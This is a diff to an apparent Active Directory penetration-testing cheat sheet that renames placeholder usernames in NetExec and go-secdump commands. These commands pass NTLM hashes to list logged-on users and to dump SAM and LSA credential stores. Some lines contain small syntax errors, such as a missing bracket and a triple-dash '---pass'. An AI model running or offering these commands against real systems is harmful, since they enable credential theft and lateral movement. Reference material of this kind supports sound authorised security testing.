@@ -433,7 +433,7 @@ NetExec smb <target_IP> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> --loggedo
 
 ####  Local account
 ```shell
-NetExec smb <target_IP> -u <AD_user> -H <hash[LM:NT]> --local-auth --loggedon-users
+NetExec smb <target_IP> -u <local_user> -H <hash[LM:NT]> --local-auth --loggedon-users
 ```
 
 </details>
@@ -871,22 +871,22 @@ u.objectid ENDS WITH "-548" RETURN q
   
   ### NetExec Dump SAM on local computer
   ```shell
-  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --sam
+  NetExec smb <target_IP> -u <local_user> -p <password> -H <hash[LM:NT]> --local-auth --sam
   ```
 
   ### sec-dump Dump SAM on local computer
   ```shell
-  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --sam --local
+  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <local_user> ---pass <password> --hash <hash[LM:NT]]> --sam --local
   ```
   
   ### NetExec Dump LSA on local computer
   ```shell
-  NetExec smb <target_IP> -u <username> -p <password> -H <hash[LM:NT]> --local-auth --lsa
+  NetExec smb <target_IP> -u <local_user> -p <password> -H <hash[LM:NT]> --local-auth --lsa
   ```
 
   ### go-secdump Dump LSA on local computer
   ```shell
-  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <username> ---pass <password> --hash <hash[LM:NT]]> --lsa --local
+  ./go-secdump --domain <Domain_Controller_IP --host <target_IP> --user <local_user> ---pass <password> --hash <hash[LM:NT]]> --lsa --local
   ```
 
   ### NetExec Dump lsass with hash_spider to recursively using BloodHound to find local admins path (adminTo)
